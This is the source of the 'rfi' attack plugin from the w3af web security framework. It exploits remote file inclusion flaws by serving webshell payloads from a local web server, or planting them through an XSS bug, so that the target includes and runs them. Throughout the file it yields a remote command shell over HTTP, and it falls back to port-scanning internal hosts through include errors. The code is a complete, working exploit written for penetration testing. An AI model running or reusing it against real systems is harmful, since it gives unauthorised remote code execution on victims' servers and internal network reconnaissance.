'''
rfi.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import os

import core.controllers.output_manager as om
import core.data.kb.knowledge_base as kb
import core.controllers.daemons.webserver as webserver
import plugins.attack.payloads.shell_handler as shell_handler
import core.data.constants.ports as ports

from core.data.fuzzer.utils import rand_alnum
from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList
from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
from core.controllers.misc.homeDir import get_home_dir
from core.controllers.misc.get_local_ip import get_local_ip
from core.data.kb.exec_shell import exec_shell as exec_shell
from core.data.kb.shell import shell as shell
from plugins.attack.payloads.decorators.exec_decorator import exec_debug


NO_SUCCESS = 0
SUCCESS_COMPLETE = 1
SUCCESS_OPEN_PORT = 2


class rfi(AttackPlugin):
    '''
    Exploit remote file include vulnerabilities.
    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self._shell = None
        self._xss_vuln = None
        self._exploit_dc = None

        # User configured variables
        self._listen_port = ports.RFI_SHELL
        self._listen_address = get_local_ip()
        self._use_XSS_vuln = True
        self._generate_only_one = True

    def fast_exploit(self, url, method, data):
        '''
        Exploits a web app with remote file include vuln.

        @param url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @param method: A string containing the method to send the data ( post / get )
        @param data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell

    def can_exploit(self, vuln_to_exploit=None):
        '''
        Searches the kb for vulnerabilities that this plugin can exploit, this
        is overloaded from AttackPlugin because I need to test for xss vulns
        also. This is a "complex" plugin.

        @param vuln_to_exploit: The id of the vulnerability to exploit.
        @return: True if plugin knows how to exploit a found vuln.
        '''
        if not self._listen_address and not self._use_XSS_vuln:
            msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
            msg += ' that can be reached by the vulnerable Web application.'
            raise w3afException(msg)

        rfi_vulns = kb.kb.get('rfi', 'rfi')
        if vuln_to_exploit is not None:
            rfi_vulns = [v for v in rfi_vulns if v.get_id() == vuln_to_exploit]

        if not rfi_vulns:
            return False
        else:

            #
            #    Ok, I have the RFI vulnerability to exploit, but... is the
            #    plugin configured in such a way that exploitation is possible?
            #
            if self._use_XSS_vuln:

                xss_vulns = kb.kb.get('xss', 'xss')

                if not xss_vulns:
                    msg = 'rfi plugin is configured to use a XSS bug to'
                    msg += ' exploit the RFI bug, but no XSS was found.'
                    om.out.console(msg)

                else:
                    #
                    #    I have some XSS vulns, lets see if they have what we need
                    #

                    for xss_vuln in xss_vulns:
                        # Set the test string
                        test_string = '<?#@!()&=?>'

                        # Test if the current xss vuln works for us:
                        function_reference = getattr(
                            self._uri_opener, xss_vuln.get_method())
                        data_container = xss_vuln.get_dc()
                        data_container[xss_vuln.get_var()] = test_string

                        try:
                            http_res = function_reference(
                                xss_vuln.get_url(), str(data_container))
                        except:
                            continue
                        else:
                            if test_string in http_res.get_body():
                                self._xss_vuln = xss_vuln
                                return True

                    # Check If I really got something nice that I can use to exploit
                    # if not, report it to the user
                    if not self._xss_vuln:
                        msg = 'rfi plugin is configured to use a XSS'
                        msg += ' vulnerability to exploit the RFI, but no XSS with the required'
                        msg += ' capabilities was found.'
                        om.out.console(msg)

            #    Using the good old webserver (if properly configured)
            if not self._listen_address:
                msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
                msg += ' that can be reached by the vulnerable Web application.'
                raise w3afException(msg)

            return True

    def get_attack_type(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'

    def get_kb_location(self):
        '''
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an vuln,
        and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding ( attack.os_commanding )
        should return 'os_commanding' in this method.
        '''
        return ['rfi',]

    def _generate_shell(self, vuln_obj):
        '''
        @param vuln_obj: The vuln to exploit.
        @return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        exploit_success = self._verify_vuln(vuln_obj)
        if exploit_success == SUCCESS_COMPLETE:

            # Create the shell object
            shell_obj = RFIShell(vuln_obj)
            shell_obj.set_url_opener(self._uri_opener)
            shell_obj.set_exploit_dc(self._exploit_dc)
            return shell_obj

        elif exploit_success == SUCCESS_OPEN_PORT:

            # Create the portscan shell object
            shell_obj = PortScanShell(vuln_obj)
            shell_obj.set_url_opener(self._uri_opener)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        extension = vuln.get_url().get_extension()

        # I get a list of tuples with file_content and extension to use
        shell_list = shell_handler.get_webshells(extension)

        for file_content, real_extension in shell_list:
            #
            #    This for loop aims to exploit the RFI vulnerability and get remote
            #    code execution.
            #
            if extension == '':
                extension = real_extension

            url_to_include = self._gen_url_to_include(file_content, extension)

            # Start local webserver
            webroot_path = os.path.join(get_home_dir(), 'webroot')
            webserver.start_webserver(self._listen_address, self._listen_port,
                                      webroot_path)

            # Prepare for exploitation...
            function_reference = getattr(self._uri_opener, vuln.get_method())
            data_container = vuln.get_dc()
            data_container[vuln.get_var()] = url_to_include

            try:
                http_res = function_reference(
                    vuln.get_url(), str(data_container))
            except:
                continue
            else:
                if shell_handler.SHELL_IDENTIFIER in http_res.body:
                    self._exploit_dc = data_container
                    return SUCCESS_COMPLETE
                else:
                    # Remove the file from the local webserver webroot
                    self._rm_file(url_to_include)

        else:

            #
            #    We get here when it was impossible to create a RFI shell, but we
            #    still might be able to do some interesting stuff
            #
            function_reference = getattr(self._uri_opener, vuln.get_method())
            data_container = vuln.get_dc()

            #    A port that should "always" be closed,
            data_container[vuln.get_var()] = 'http://localhost:92/'

            try:
                http_response = function_reference(
                    vuln.get_url(), str(data_container))
            except:
                return False
            else:
                rfi_errors = ['php_network_getaddresses: getaddrinfo',
                              'failed to open stream: Connection refused in']
                for error in rfi_errors:
                    if error in http_response.get_body():
                        return SUCCESS_OPEN_PORT

        return NO_SUCCESS

    def _gen_url_to_include(self, file_content, extension):
        '''
        Generate the URL to include, based on the configuration it will return a
        URL pointing to a XSS bug, or our local webserver.
        '''
        if self._use_XSS_vuln and self._xss_vuln:
            url = self._xss_vuln.get_url().uri2url()
            data_container = self._xss_vuln.get_dc()
            data_container = data_container.copy()
            data_container[self._xss_vuln.get_var()] = file_content
            url_to_include = url + '?' + str(data_container)
            return url_to_include
        else:
            # Write the php to the webroot
            filename = rand_alnum()
            try:
                file_handler = open(
                    os.path.join(get_home_dir(), 'webroot', filename), 'w')
                file_handler.write(file_content)
                file_handler.close()
            except:
                raise w3afException('Could not create file in webroot.')
            else:
                url_to_include = 'http://' + self._listen_address + ':'
                url_to_include += str(self._listen_port) + '/' + filename
                return url_to_include

    def _rm_file(self, url_to_include):
        '''
        Remove the file in the webroot.

        PLEASE NOTE: This is duplicated code!! see the same note above.
        '''
        if not self._use_XSS_vuln:
            # Remove the file
            filename = url_to_include.split('/')[-1:][0]
            os.remove(os.path.join(get_home_dir(), 'webroot', filename))

    def get_options(self):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'IP address that the webserver will use to receive requests'
        h1 = 'w3af runs a webserver to serve the files to the target web app'
        h1 += ' when doing remote file inclusions. This setting configures on what IP address the'
        h1 += ' webserver is going to listen.'
        o1 = opt_factory(
            'listen_address', self._listen_address, d1, 'string', help=h1)

        d2 = 'Port that the webserver will use to receive requests'
        h2 = 'w3af runs a webserver to serve the files to the target web app'
        h2 += ' when doing remote file inclusions. This setting configures on what IP address'
        h2 += ' the webserver is going to listen.'
        o2 = opt_factory(
            'listen_port', self._listen_port, d2, 'integer', help=h2)

        d3 = 'Instead of including a file in a local webserver; include the result of'
        d3 += ' exploiting a XSS bug.'
        o3 = opt_factory('useXssBug', self._use_XSS_vuln, d3, 'boolean')

        d4 = 'If true, this plugin will try to generate only one shell object.'
        o4 = opt_factory(
            'generateOnlyOne', self._generate_only_one, d4, 'boolean')

        ol = OptionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        return ol

    def set_options(self, options_list):
        '''
        This method sets all the options that are configured using the user interface
        generated by the framework using the result of get_options().

        @param options_list: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._listen_address = options_list['listen_address'].get_value()
        self._listen_port = options_list['listen_port'].get_value()
        self._use_XSS_vuln = options_list['useXssBug'].get_value()
        self._generate_only_one = options_list['generateOnlyOne'].get_value()

        if self._listen_address == '' and not self._use_XSS_vuln:
            om.out.error('rfi plugin has to be correctly configured to use.')
            return False

    def get_root_probability(self):
        return 0.8

    def get_long_desc(self):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a
        remote shell. The exploitation can be done using a more classic approach,
        in which the file to be included is hosted on a webserver that the plugin
        runs, or a nicer approach, in which a XSS bug on the remote site is used
        to generate the remote file to be included. Both ways work and return a
        shell, but the one that uses XSS will work even when a restrictive firewall
        is configured at the remote site.

        Four configurable parameters exist:
            - listen_address
            - listen_port
            - useXssBug
            - generateOnlyOne
        '''


class PortScanShell(shell):
    '''
    I create this shell when for some reason I was unable to create the RFIShell,
    AND the "include()" method is showing errors, allowing me to determine if a
    port is open or not.
    '''
    def __init__(self, vuln):
        '''
        Create the obj
        '''
        shell.__init__(self, vuln)

    def is_open_port(self, host, port):
        '''
        @return: True if the host:port is open.
        '''
        port_open_dc = self.get_dc()
        port_open_dc = port_open_dc.copy()
        port_open_dc[self.get_var()] = 'http://%s:%s/' % (host, port)

        function_reference = getattr(self._uri_opener, self.get_method())
        try:
            http_response = function_reference(
                self.get_url(), str(port_open_dc))
        except w3afException, w3:
            return 'Exception from the remote web application: "%s"' % w3
        except Exception, e:
            return 'Unhandled exception, "%s"' % e
        else:
            if 'HTTP request failed!' in http_response.get_body():
                #    The port is open but it's not an HTTP daemon
                return True
            elif 'failed to open stream' not in http_response.get_body():
                #    Open port, AND HTTP daemon
                return True
            else:
                return False

    def get_name(self):
        return 'portscan-shell object'


class RFIShell(exec_shell, PortScanShell):
    '''
    I create this shell when the remote host allows outgoing connections, or when
    the attack plugin was configured to use XSS vulnerabilities to exploit the RFI and
    a XSS vulnerability was actually found.
    '''
    def __init__(self, vuln):
        '''
        Create the obj
        '''
        PortScanShell.__init__(self, vuln)
        exec_shell.__init__(self, vuln)

        self._exploit_dc = None

    def set_exploit_dc(self, e_dc):
        '''
        Save the exploit data container, that holds all the parameters for a
        successful exploitation

        @param e_dc: The exploit data container.
        '''
        self._exploit_dc = e_dc

    def get_exploit_dc(self):
        '''
        Get the exploit data container.
        '''
        return self._exploit_dc

    @exec_debug
    def execute(self, command):
        '''
        This method is called when a user writes a command in the shell and hits enter.

        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @param command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        e_dc = self.get_exploit_dc()
        e_dc = e_dc.copy()
        e_dc['cmd'] = command

        function_reference = getattr(self._uri_opener, self.get_method())
        try:
            http_res = function_reference(self.get_url(), str(e_dc))
        except w3afException, w3:
            return 'Exception from the remote web application:' + str(w3)
        except Exception, e:
            return 'Unhandled exception from the remote web application:' + str(e)
        else:
            return shell_handler.extract_result(http_res.get_body())

    def end(self):
        '''
        Finish execution, clean-up, remove file.
        '''
        om.out.debug('Remote file inclusion shell is cleaning up.')
        try:
            self._rm_file(self.get_exploit_dc()[self.get_var()])
        except Exception, e:
            msg = 'Remote file inclusion shell cleanup failed with exception: %s'
            om.out.error(msg % e)
        else:
            om.out.debug('Remote file inclusion shell cleanup complete.')

    def get_name(self):
        return 'RFIShell'

    def _rm_file(self, url_to_include):
        '''
        Remove the file in the webroot.

        PLEASE NOTE: This is duplicated code!! see the same note above.
        '''
        # Remove the file
        filename = url_to_include.split('/')[-1:][0]
        os.remove(os.path.join(get_home_dir(), 'webroot', filename))
